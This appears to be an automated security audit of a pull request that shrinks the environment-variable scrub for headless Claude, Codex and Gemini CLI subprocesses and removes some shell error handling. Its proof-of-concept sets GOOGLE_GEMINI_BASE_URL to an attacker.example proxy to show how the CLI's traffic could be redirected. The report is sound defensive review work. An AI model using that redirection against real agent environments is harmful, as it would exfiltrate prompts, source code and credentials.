# Security Audit Report

**Audit type**: Ad-hoc PR audit (`/audit`)
**Scope**: `head.diff` — 3 files touched (`.claude/adapters/loa_cheval/providers/base.py`, `.claude/scripts/flatline-orchestrator.sh`, `.claude/scripts/loa-status.sh`)
**PR**: "chore(cheval,flatline,status): shorten the headless env scrub, temp-file handling and flag parsing"

## Executive Summary

This PR bills itself as a simplification/cleanup, but one of the three changes is a genuine security regression, not a simplification. `build_headless_subprocess_env()` in `base.py` is the control that closed issues #879/#880 — it exists specifically to force headless CLI subprocesses (claude/codex/gemini) onto their OAuth-subscription auth path instead of falling back to API-key/alternate-endpoint auth. The PR shrinks the stripped-var list from nine entries to five, dropping all four "auth-mode-selector" variables the original implementation called out by name in its own docstring as required stripping targets. The remaining two changes (mktemp error handling removal in `flatline-orchestrator.sh`, and flag/color handling in `loa-status.sh`) are robustness and UX regressions, not exploitable vulnerabilities, but they remove existing defensive code without replacing it.

**Overall Risk Level**: HIGH

## Key Statistics

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 1 |
| Medium | 2 |
| Low | 2 |

## High Priority Issues

### H-1: Headless subprocess env scrub no longer strips Gemini auth-mode-selector vars, reopening #879/#880

- **Component**: `head/.claude/adapters/loa_cheval/providers/base.py:466-477` (stripped-var tuple), `head/.claude/adapters/loa_cheval/providers/base.py:481-504` (`build_headless_subprocess_env`)
- **Severity**: HIGH
- **Description**: The function's own docstring (`head/.claude/adapters/loa_cheval/providers/base.py:459-464`) states the purpose: *"The CLI tools (claude / codex / gemini) prefer their OAuth-subscription auth path, but if any of these vars are exported in the parent process the CLI falls back to API mode — defeating the headless adapter's purpose."* The base-state list (`base/.claude/adapters/loa_cheval/providers/base.py:472-482`) stripped nine vars, including four Gemini CLI auth-mode selectors:
  - `GOOGLE_GENAI_USE_VERTEXAI`
  - `GOOGLE_GENAI_USE_GCA`
  - `GOOGLE_GEMINI_BASE_URL`
  - `GEMINI_CLI_USE_COMPUTE_ADC`

  The PR deletes all four from `_HEADLESS_STRIPPED_AUTH_VARS` (`head/.claude/adapters/loa_cheval/providers/base.py:472-477`), leaving only the plain credential vars (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`). The docstring was edited to match ("remove auth-class vars", `head/.claude/adapters/loa_cheval/providers/base.py:484-487`) but the code change itself reverses the fix these issues shipped, it doesn't just reword documentation.
- **Impact**:
  1. If `GOOGLE_GEMINI_BASE_URL` is set anywhere in the parent process's environment (accidentally, by a misconfigured CI runner, a compromised dependency's install script, or a malicious `.env`/profile injected upstream of the agent), it now flows unstripped into the headless Gemini subprocess. That variable redirects the Gemini CLI's outbound API traffic to an arbitrary base URL — a direct path for exfiltrating prompt/session content (which may include source code, secrets pulled into context, or credentials) to an attacker-controlled endpoint. This is exactly the SSRF/exfil class of risk the credential-stripping contract exists to close.
  2. `GOOGLE_GENAI_USE_VERTEXAI` / `GOOGLE_GENAI_USE_GCA` / `GEMINI_CLI_USE_COMPUTE_ADC` force the CLI into API/service-account/ADC auth modes instead of OAuth-subscription, silently defeating the headless adapter's auth-mode guarantee — the same failure mode #879/#880 were opened to fix, just via mode-selector vars instead of raw API keys.
  3. Unlike the `LOA_HEADLESS_KEEP_API_KEY=1` path, there is no explicit operator opt-in gating this — the vars are now permanently unstripped for every headless invocation, regardless of operator intent.
- **Proof of Concept**:
  ```python
  import os
  os.environ["GOOGLE_GEMINI_BASE_URL"] = "https://attacker.example/gemini-proxy"
  from loa_cheval.providers.base import build_headless_subprocess_env
  env = build_headless_subprocess_env()
  assert env.get("GOOGLE_GEMINI_BASE_URL") == "https://attacker.example/gemini-proxy"  # passes post-PR; failed pre-PR
  ```
  A subprocess launched with this `env` sends its Gemini CLI traffic to the attacker's proxy.
- **Remediation**: Restore the four removed entries to `_HEADLESS_STRIPPED_AUTH_VARS` (`head/.claude/adapters/loa_cheval/providers/base.py:472-477`):
  ```python
  _HEADLESS_STRIPPED_AUTH_VARS: tuple = (
      "ANTHROPIC_API_KEY",
      "OPENAI_API_KEY",
      "GOOGLE_API_KEY",
      "GEMINI_API_KEY",
      "GOOGLE_APPLICATION_CREDENTIALS",
      "GOOGLE_GENAI_USE_VERTEXAI",
      "GOOGLE_GENAI_USE_GCA",
      "GOOGLE_GEMINI_BASE_URL",
      "GEMINI_CLI_USE_COMPUTE_ADC",
  )
  ```
  and restore the docstring language distinguishing the credential sub-class from the auth-mode-selector sub-class, so the next "simplification" pass doesn't repeat this. If any of the four are genuinely obsolete (e.g., no longer read by current Gemini CLI versions), that must be justified per-variable against the current CLI's env contract, not dropped as a batch under a "shorten" commit.
- **References**: CWE-668 (Exposure of Resource to Wrong Sphere), CWE-441 (Unintended Proxy/Intermediary, applicable to `GOOGLE_GEMINI_BASE_URL` redirection), OWASP A05:2021 (Security Misconfiguration). Regresses fixes for issues #879/#880 referenced in the function's own docstring.

## Medium Priority Issues

### M-1: `mktemp` failure handling removed in verdict-quality aggregation path

- **Component**: `head/.claude/scripts/flatline-orchestrator.sh:576-577`
- **Severity**: MEDIUM
- **Description**: The base version wrapped `tmp=$(mktemp ...)` in `if ! tmp=$(mktemp ...); then log "WARNING..."; continue; fi`, so a `mktemp` failure (e.g., `/tmp` full, unwritable, or `TEMP_DIR` misconfigured) skipped just that input file with a diagnostic message. The PR removes the guard entirely (`head/.claude/scripts/flatline-orchestrator.sh:576-577`):
  ```bash
  local tmp
  tmp=$(mktemp "${TEMP_DIR:-/tmp}/vq-input.XXXXXX.json")
  printf '%s' "$vq" > "$tmp"
  ```
  Because the script runs under `set -euo pipefail` (`head/.claude/scripts/flatline-orchestrator.sh:47`), a `mktemp` failure now aborts the entire orchestrator run with a bare non-zero exit and no orchestrator-level log line explaining why — rather than degrading gracefully for one input file as originally designed.
- **Impact**: Reduced resilience/observability for the Flatline consensus pipeline under resource-exhaustion conditions (e.g., an attacker or runaway process filling `/tmp` denies the entire multi-model review, not just one voice's verdict-quality envelope). Not independently exploitable, but it is a regression in the availability posture of a review gate that other controls (adversarial review gating) depend on being able to complete or fail loudly.
- **Remediation**: Restore explicit `mktemp` failure handling with a `log` call before `continue`/`exit`, as in the base version.
- **References**: CWE-703 (Improper Check for Unusual Conditions), OWASP A09:2021 (Security Logging and Monitoring Failures — loss of the WARNING log on this path).

### M-2: `mktemp` failure handling removed in arbiter prompt-file path

- **Component**: `head/.claude/scripts/flatline-orchestrator.sh:2280-2282`
- **Severity**: MEDIUM
- **Description**: Same pattern as M-1, applied to the autonomous-arbiter prompt file:
  ```bash
  local arbiter_prompt_file
  arbiter_prompt_file=$(mktemp)
  chmod 600 "$arbiter_prompt_file"
  ```
  The base version's `if ! arbiter_prompt_file=$(mktemp); then log "ERROR..."; continue; fi` logged the error and skipped the arbiter step for the current phase only. Post-PR, under `set -euo pipefail`, a failure here kills the whole run instead of skipping one phase's arbitration, and the failure is undiagnosed (no `log` call fires before exit).
- **Impact**: Same class as M-1 — availability/diagnosability regression in the arbiter step of the Flatline autonomous-review gate, which BLOCKER-class disputes rely on to resolve.
- **Remediation**: Restore the explicit `mktemp` failure branch with logging.
- **References**: CWE-703, OWASP A09:2021.

## Low Priority Issues

### L-1: `loa-status.sh` always emits ANSI color codes, ignoring `NO_COLOR` and non-TTY output

- **Component**: `head/.claude/scripts/loa-status.sh:29-35`
- **Severity**: LOW
- **Description**: The base version gated color-code assignment on `[[ -z "${NO_COLOR:-}" ]] && [[ -t 1 ]]`, falling back to empty strings otherwise. The PR hardcodes the ANSI escapes unconditionally:
  ```bash
  # Colors
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[1;33m'
  CYAN='\033[0;36m'
  BOLD='\033[1m'
  NC='\033[0m'
  ```
  These are used throughout the non-JSON human-readable path (e.g., `head/.claude/scripts/loa-status.sh:188,194,200-201,233-234,241`).
- **Impact**: Breaks the `NO_COLOR` convention and pollutes output with raw escape sequences whenever stdout is redirected to a file, piped into another tool, or captured by CI logs/other scripts that scan `loa-status.sh` text output (e.g., grep-based recovery/health checks referenced elsewhere in this repo's hook and run-mode tooling). This is a correctness/robustness regression, not directly exploitable, but it can cause downstream text-matching logic to silently misbehave.
- **Remediation**: Restore the `NO_COLOR`/`-t 1` conditional.
- **References**: CWE-1078 (loosely — improper handling of output formatting expectations); no CVE/OWASP mapping, functional regression.

### L-2: `loa-status.sh` silently swallows unrecognized flags instead of failing with usage

- **Component**: `head/.claude/scripts/loa-status.sh:60-64`
- **Severity**: LOW
- **Description**: The base version tracked `UNKNOWN_ARGS` and, outside `--economy` mode, exited 2 with a usage message via `dx_unknown_flag` (or a fallback `echo`) when unrecognized flags were passed. The PR removes `UNKNOWN_ARGS` and the entire validation block (previously at the position now occupied by `head/.claude/scripts/loa-status.sh:64-65`), so any unrecognized flag simply falls into the `*)` case and is appended to `ECONOMY_ARGS`, which is only consumed when `ECONOMY_MODE == true`. In the default (non-economy) mode, unknown flags are now accepted and silently ignored.
- **Impact**: A caller (human or another script/hook) that passes a mistyped or unsupported flag (e.g., `loa-status.sh --jsonn`) gets no error and no indication the flag was ignored — it just gets default output. This can mask misconfiguration in scripts/hooks that shell out to `loa-status.sh` with dynamically constructed arguments, and removes an explicit fail-fast contract in favor of silent best-effort behavior.
- **Remediation**: Restore the `UNKNOWN_ARGS` tracking and the exit-2 validation block for non-economy-mode unknown flags.
- **References**: CWE-390-adjacent (Detection of Error Condition Without Action); functional/UX regression, not directly exploitable.

## Threat Model Summary

The primary attacker-relevant asset here is the headless-adapter environment boundary: it exists to guarantee that when Loa dispatches a review/audit/arbiter model call through a locally-installed CLI, that call cannot be silently redirected to a different auth mode or endpoint by ambient environment state the CLI process inherits. H-1 directly breaks that guarantee for the Gemini CLI's mode-selector and base-URL variables. The remaining findings degrade availability/observability of the Flatline review pipeline (M-1, M-2) and general operational hygiene of the status CLI (L-1, L-2); none of the three are attacker-reachable through this diff alone, but M-1/M-2 reduce the pipeline's ability to fail loudly when resource-exhaustion conditions are attacker-induced.

## Security Checklist Status

- [x] Secrets & Credentials — reviewed; H-1 is env-var credential/auth-mode leakage, not hardcoded secrets
- [x] Authentication & Authorization — H-1 directly concerns auth-mode enforcement
- [ ] Input Validation — N/A to this diff
- [x] Supply Chain / Environment Isolation — H-1 is squarely in this category
- [x] Error Handling — M-1, M-2
- [x] Logging & Observability — M-1, M-2 remove WARNING/ERROR log lines
- [x] CLI Output Contracts — L-1, L-2

## Verdict

CHANGES_REQUIRED

**Rationale**: H-1 alone forces `CHANGES_REQUIRED` under the one-way severity rule (critical+high > 0). The headless auth-mode env-scrub is a previously-shipped security fix (#879/#880); this PR's "shortening" silently reverts the auth-mode-selector half of it while leaving the docstring's high-level claim ("remove auth-class vars") technically true only for the reduced definition of "auth-class" the PR itself just narrowed. Recommend: restore the four removed vars in `_HEADLESS_STRIPPED_AUTH_VARS`, and restore the `mktemp` error-handling branches in `flatline-orchestrator.sh` before merge. L-1/L-2 should be fixed but do not block on their own.

**Immediate (before merge)**: Fix H-1.
**Short-term (this week)**: Fix M-1, M-2.
**Long-term**: Fix L-1, L-2; consider a regression test asserting `build_headless_subprocess_env()` strips all nine original vars, so future "simplification" PRs can't silently shrink this list again.

<!-- LOA-VERDICT {"gate":"audit","verdict":"CHANGES_REQUIRED","counts":{"critical":0,"high":1,"medium":2,"low":2},"sprint_id":"adhoc-pr-audit","ts":"2026-09-21T00:00:00Z"} -->
